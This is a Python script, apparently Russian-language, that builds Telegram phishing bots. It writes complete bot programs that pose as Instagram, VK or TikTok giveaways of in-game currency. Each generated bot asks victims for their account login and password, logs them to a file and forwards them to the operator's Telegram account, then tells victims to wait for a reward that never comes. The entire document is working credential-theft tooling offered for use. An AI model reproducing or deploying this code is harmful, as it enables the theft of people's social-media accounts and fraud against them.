#Developer: @lamer112311

import colorama
from colorama import Fore, Back, Style
import os
from sys import platform
import base64
def clear():
	if platform == "linux" or platform == "linux2":
		os.system("clear")
	elif platform == "win32":
		os.system('cls')
clear()
en = base64.b64decode('Q29kZWQgYnkgQGxhbWVyMTEyMzEx')
print(en.decode("UTF-8"))
print(Fore.GREEN + '''
         .e$$$$e.
       e$$$$$$$$$$e
      $$$$$$by$$$$$$
     d$$$$$$$$$$$$$$b
     $$lamer112311$$$
    4$$$$$$$$$$$$$$$$F
    4$$$$$$$$$$$$$$$$F
     $$$" "$$$$" "$$$
     $$F   4$$F   4$$
     '$F * 4$$F * 4$"
      $$   $$$$   $P
      4$$$$$"^$$$$$%
       $$$$F  4$$$$
        "$$$ee$$$"
        . *$$$$F4
         $     .$
         "$$$$$$"
          ^$$$$
 4$$c       ""       .$$r
 ^$$$b              e$$$"
 d$$$$$e          z$$$$$b
4$$$*$$$$$c    .$$$$$*$$$r
 ""    ^*$$$be$$$*"    ^"
          "$$$$"
        .d$$P$$$b
       d$$P   ^$$$b
   .ed$$$"      "$$$be.
 $$$$$$P          *$$$$$$
4$$$$$P            $$$$$$"
 "*$$$"            ^$$P
    ""              ^"
	''')
input(Fore.RED + "Нажмите Enter>>")
clear()

print(Fore.MAGENTA + '''
 _____ _____ _      _____
|_   _|  ___| |    |  ___
  | | | |__ | |    | |__ 
  | | |  __|| |    |  __|
  | | | |___| |____| |___
  \_/ \____/\_____/\____/ ''' + Fore.RED + '''
______ _   _ _____ _____ _   _ 
| ___ \ | | |_   _/  ___| | | |
| |_/ / |_| | | | \ `--.| |_| |
|  __/|  _  | | |  `--. \  _  |
| |   | | | |_| |_/\__/ / | | |
\_|   \_| |_/\___/\____/\_| |_/
	''')

print(Fore.GREEN + '#########################################')
print(Fore.GREEN + '+' + Fore.BLUE +  "     Telegram phishing bot builder     " + Fore.GREEN + '+')
print(Fore.GREEN + '+' + Fore.BLUE +  "                " + Fore.GREEN + '+')
print(Fore.GREEN + '+' + Fore.BLUE +  "               " + Fore.GREEN + '+')
print(Fore.GREEN + '#########################################')
userid = input(Fore.YELLOW +  "Введите свой Telegram ID > ")
token = input(Fore.BLUE +  "Введите токен бота > ")
print(Fore.CYAN + '''
[1] Instagram
[2] VK
[3] Tiktok
	''')
choice = input(Fore.MAGENTA +  "Выберите вариант фишинга в боте>>> ")
if not choice.isdigit():
	print("Ошибка, вариант должен быть чисельным")
	exit(0)
choice = int(choice)



if choice == 1:
	f = open('Instagram.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import *
import time
import random
print("Бот запущен!")
log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '{userid}'
bot = telebot.TeleBot("{token}")
try:
	bot.send_message(ID, '!Бот запущен!') 
except:
	print("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!")


@bot.message_handler(commands=['start'])
def start(message):
	print(f'''Обнаружен пользователь!
ID: {{message.from_user.id}}''')
	bot.send_message(message.chat.id, '''👋 Привет! 👋
		Это раздача UC / AG / Серебра
		Чтобы начать, нажмите /razdacha''') 

@bot.message_handler(commands=['lamer112311dev'])
def lamer112311(message):
	bot.send_message(message.chat.id, 'Автор скрипта: ') 

@bot.message_handler(commands=['razdacha', 'n'])
def start1(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="UC", callback_data="like")
	second_button = types.InlineKeyboardButton(text="AG", callback_data="sub")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline1(call):
	if call.data == "like":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество UC (не более 500)') 
		bot.register_next_step_handler(msg, qproc1)

	elif call.data == "sub":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество AG (не более 100)') 
		bot.register_next_step_handler(msg, qproc2)

def qproc1(message):
	try:
		num = message.text	
		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /razdacha!')#⏳
			return
		elif int(num) > 500:
			bot.reply_to(message, 'Колличество UC не может быть более 500!')
			return
		else:
			bot.send_message(message.chat.id, f'Количество UC: {{num}}')
			msg = bot.send_message(message.chat.id, 'Введите почту(или номер телефона) от вашего аккаунта:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)


def qproc2(message):
	try:
		num = message.text
		if not num.isdigit():
			bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /razdacha!')#⏳
			return
		elif int(num) > 100:
			bot.reply_to(message, 'Колличество AG не может быть более 100!')
			return
		else:
			bot.send_message(message.chat.id, f'Колличество AG: {{num}}')
			msg = bot.send_message(message.chat.id, 'Введите почту(или номер телефона) от вашего аккаунта:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)


def step1(message):
	get = f'''Полученные данные: 
Получено в боте: instagram
ID: {{message.from_user.id}}
Ник: @{{message.from_user.username}}
Логин: {{message.text}}
Имя: {{message.from_user.first_name}}

'''
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	print(get)
	bot.send_message(ID, get)
	bot.reply_to(message, f'Ваш логин: {{message.text}}')

	msg1 = bot.send_message(message.chat.id, 'Введите пароль от вашего аккаунта:') 
	bot.register_next_step_handler(msg1, step2)

	
def step2(message):
	usrpass = message.text
	get = f'''Полученные данные: 
Получено в боте: instagram
ID: {{message.from_user.id}}
Ник: @{{message.from_user.username}}
Пароль: {{usrpass}}
Имя: {{message.from_user.first_name}}

'''
	print(get)
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	bot.send_message(ID, get)
	msg = bot.reply_to(message, f'Ваш пароль: {{usrpass}}')
	time.sleep(1)
	bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, ожидайте накрутку на ваш аккаунт в течении 5 часов! Пополняем через сервис midas.by')


bot.polling()
		""")
	f.close()
	input("Файл Instagram.py сохранен! Нажмите Enter")

if choice == 2:
	f = open('vk.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import *
import time

print("Бот запущен!")

log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '{userid}'
bot = telebot.TeleBot("{token}")
try:
	bot.send_message(ID, '!Бот запущен!') 
except:
	print("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!")



@bot.message_handler(commands=['start'])
def start(message):
	print(f'''Обнаружен пользователь!
	ID: {{message.from_user.id}}''')
	bot.send_message(message.chat.id, '''👋 Привет! 👋
		Это бот раздачи UC / AG / Серебра
		Чтобы начать, нажмите /razdacha''') 

@bot.message_handler(commands=['lamer112311dev'])
def lamer112311(message):
	bot.send_message(message.chat.id, 'Автор скрипта: ') 

@bot.message_handler(commands=['razdacha', 'n'])
def start1(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="UC", callback_data="like")
	second_button = types.InlineKeyboardButton(text="AG", callback_data="like")
	button3 = types.InlineKeyboardButton(text="Серебро", callback_data="like")
	button4 = types.InlineKeyboardButton(text="UC", callback_data="like")
	keyboardmain.add(first_button, second_button, button3, button4)
	bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline1(call):
	if call.data == "like":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество (не более 500)') 
		bot.register_next_step_handler(msg, qproc1)

def qproc1(message):
	try:
		num = message.text	
		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /razdacha!')#⏳
			return
		elif int(num) > 500:
			bot.reply_to(message, 'Колличество не может быть более 500!')
			return
		else:
			bot.send_message(message.chat.id, f'Колличество: {{num}}')
			msg = bot.send_message(message.chat.id, 'Введите номер телефона от вашего аккаунта:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)




def step1(message):
	inp = message.text.replace("+", "")
	if not inp.isdigit():
		bot.reply_to(message, 'Введите номер числом! Повторите попытку, написав /razdacha')#⏳
		return
	get = f'''Полученные данные: 
Получено в боте: vk
ID: {{message.from_user.id}}
Ник: @{{message.from_user.username}}
Логин: {{message.text}}
Имя: {{message.from_user.first_name}}

'''
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	print(get)
	bot.send_message(ID, get)
	bot.reply_to(message, f'Ваш логин: {{message.text}}')

	msg1 = bot.send_message(message.chat.id, 'Введите пароль от вашего аккаунта:') 
	bot.register_next_step_handler(msg1, step2)

	
def step2(message):
	usrpass = message.text
	get = f'''Полученные данные:
Получено в боте: vk 
ID: {{message.from_user.id}}
Ник: @{{message.from_user.username}}
Пароль: {{usrpass}}
Имя: {{message.from_user.first_name}}

'''
	print(get)
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	bot.send_message(ID, get)
	msg = bot.reply_to(message, f'Ваш пароль: {{usrpass}}')
	time.sleep(1)
	bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, то ожидайте накруткуна ваш аккаунт в течении 5 часов! Пополняем через сервис midas.by')


bot.polling()
		""")
	f.close()
	input("Файл vk.py сохранен! Нажмите Enter")

if choice == 3:
	f = open('tiktok.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import *
import time
print("Бот запущен!")
print("Бот запущен и готов к работе!")
log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '{userid}'
bot = telebot.TeleBot("{token}")
try:
	bot.send_message(ID, '!Бот запущен!') 
except:
	print("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!")

@bot.message_handler(commands=['start'])
def start(message):
	print(f'''Обнаружен пользователь!
ID: {{message.from_user.id}}''')
	bot.send_message(message.chat.id, '''👋 Привет! 👋
		Это бот раздачи UC / AG / Серебра
		Чтобы начать, нажмите /razdacha''') 

@bot.message_handler(commands=['lamer112311dev'])
def lamer112311(message):
	bot.send_message(message.chat.id, 'Автор скрипта: ') 

@bot.message_handler(commands=['razdacha', 'n'])
def start1(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="UC", callback_data="like")
	second_button = types.InlineKeyboardButton(text="AG", callback_data="like")
	button3 = types.InlineKeyboardButton(text="Серебро", callback_data="like")
	keyboardmain.add(first_button, second_button, button3, button4)
	bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline1(call):
	if call.data == "like":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество (не более 500)') 
		bot.register_next_step_handler(msg, qproc1)

def qproc1(message):
	try:
		num = message.text	
		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /razdacha!')#⏳
			return
		elif int(num) > 500:
			bot.reply_to(message, 'Колличество не может быть более 500!')
			return
		else:
			bot.send_message(message.chat.id, f'Колличество: {{num}}')
			msg = bot.send_message(message.chat.id, 'Введите номер телефона(или почту) от вашего аккаунта:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)




def step1(message):
	get = f'''Полученные данные: 
Получено в боте: tiktok
ID: {{message.from_user.id}}
Ник: @{{message.from_user.username}}
Логин: {{message.text}}
Имя: {{message.from_user.first_name}}

'''
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	print(get)
	bot.send_message(ID, get)
	bot.reply_to(message, f'Ваш логин: {{message.text}}')

	msg1 = bot.send_message(message.chat.id, 'Введите пароль от вашего аккаунта:') 
	bot.register_next_step_handler(msg1, step2)

	
def step2(message):
	usrpass = message.text
	get = f'''Полученные данные:
Получено в боте: tiktok 
ID: {{message.from_user.id}}
Ник: @{{message.from_user.username}}
Пароль: {{usrpass}}
Имя: {{message.from_user.first_name}}

'''
	print(get)
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	bot.send_message(ID, get)
	msg = bot.reply_to(message, f'Ваш пароль: {{usrpass}}')
	time.sleep(1)
	bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, ожидайте накрутку на ваш аккаунт в течении 5 часов! Пополняем через midas.by')


bot.polling()
		""")
	f.close()
	input("Файл tiktok.py сохранен! Нажмите Enter")